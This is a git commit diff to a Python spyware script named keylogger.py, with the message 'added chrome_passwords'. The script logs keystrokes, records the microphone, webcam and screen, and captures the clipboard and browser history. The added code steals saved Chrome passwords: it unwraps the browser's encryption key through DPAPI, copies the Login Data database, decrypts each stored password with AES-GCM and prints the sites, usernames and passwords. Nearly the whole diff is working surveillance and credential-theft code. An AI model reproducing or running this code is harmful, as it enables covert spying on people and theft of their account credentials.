1575c1c48ac2ccd9808b7b4811c90e50c505183b
Roman Klym <klymroman@protonmail.com>
2021-10-31 15:31:43 +0200

    added chrome_passwords

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,28 @@
-import subprocess, win32clipboard, os, cv2, time, sounddevice, logging, json, shutil
+import subprocess
+import win32clipboard
+import os
+import cv2
+import sounddevice
+import logging
+import json
+import shutil
 import browserhistory as bh
 from scipy.io.wavfile import write as write_rec
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
-from threading import Thread  
+from threading import Thread
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+from datetime import timezone, datetime, timedelta, time
 
 
 def keylogger():
-    logging.basicConfig(filename=('./results/key_log/' + 'key_logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    logging.basicConfig(filename=('./results/key_log/' + 'key_logs.txt'),
+                        level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-    on_press = lambda Key : logging.info(str(Key))
+    def on_press(Key): return logging.info(str(Key))
     with Listener(on_press=on_press) as listener:
         listener.join()
 
@@ -26,9 +39,11 @@ def microphone():
         fs = 44100
         seconds = 60
 
-        recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
+        recording = sounddevice.rec(
+            int(seconds * fs), samplerate=fs, channels=2)
         sounddevice.wait()
-        write_rec('./results/microphone/' + '{}_mic_recording.wav'.format(_), fs, recording)
+        write_rec('./results/microphone/' +
+                  '{}_mic_recording.wav'.format(_), fs, recording)
 
 
 def webcam():
@@ -48,9 +63,44 @@ def webcam():
         print("Web camera isn't availible")
 
 
+def get_chrome_datetime(chromedate):
+    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+def decrypt_password(password, key):
+    try:
+        # get the initialization vector
+        iv = password[3:15]
+        password = password[15:]
+        # generate cipher
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        # decrypt password
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return ""
+
+
 def main():
 
-    directories = ['./results/screenshots/', './results/key_log/', './results/microphone/', './results/webcam/']
+    directories = ['./results/screenshots/', './results/key_log/',
+                   './results/microphone/', './results/webcam/']
 
     for i in directories:
         if os.path.exists(i):
@@ -63,11 +113,53 @@ def main():
                 shutil.rmtree(i)
                 print("Deleted {} directory".format(i))
                 os.mkdir(i)
-                print("Created new directory")      
-        
+                print("Created new directory")
+
         else:
             print("Directory was not found")
-    
+
+    # Get Chrome passwords
+    key = get_encryption_key()
+
+    # Mac OS path = ~/Library/Application Support/Google/Chrome/Default/Login Data
+
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                           "Google", "Chrome", "User Data", "default", "Login Data")
+
+    filename = "ChromeData.db"
+    shutil.copyfile(db_path, filename)
+
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+
+    cursor.execute(
+        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+
+    for row in cursor.fetchall():
+        origin_url = row[0]
+        action_url = row[1]
+        username = row[2]
+        password = decrypt_password(row[3], key)
+        date_created = row[4]
+        date_last_used = row[5]
+        if username or password:
+            print(f"Origin URL: {origin_url}")
+            print(f"Action URL: {action_url}")
+            print(f"Username: {username}")
+            print(f"Password: {password}")
+        else:
+            continue
+        if date_created != 86400000000 and date_created:
+            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
+        if date_last_used != 86400000000 and date_last_used:
+            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
+        print("="*50)
+    cursor.close()
+    db.close()
+    try:
+        os.remove(filename)
+    except:
+        pass
 
     # Clipboard Data
     win32clipboard.OpenClipboard()
@@ -76,7 +168,6 @@ def main():
 
     with open('./results/key_log/' + 'clipboard_info.txt', 'a') as clipboard_info:
         clipboard_info.write('Clipboard Data: ' + pasted_data + ' \n')
-
 
     # Browser History
     browser_history = []
@@ -87,8 +178,8 @@ def main():
     print(browsers)
     browser_history.extend((bh_user, db_path, hist))
     with open('./results/key_log/' + 'browser.txt', 'a') as browser_txt:
-        browser_txt.write(json.dumps(browser_history, indent=4, sort_keys=True))  
-
+        browser_txt.write(json.dumps(
+            browser_history, indent=4, sort_keys=True))
 
     t1 = Thread(target=keylogger)
     t2 = Thread(target=screenshot)
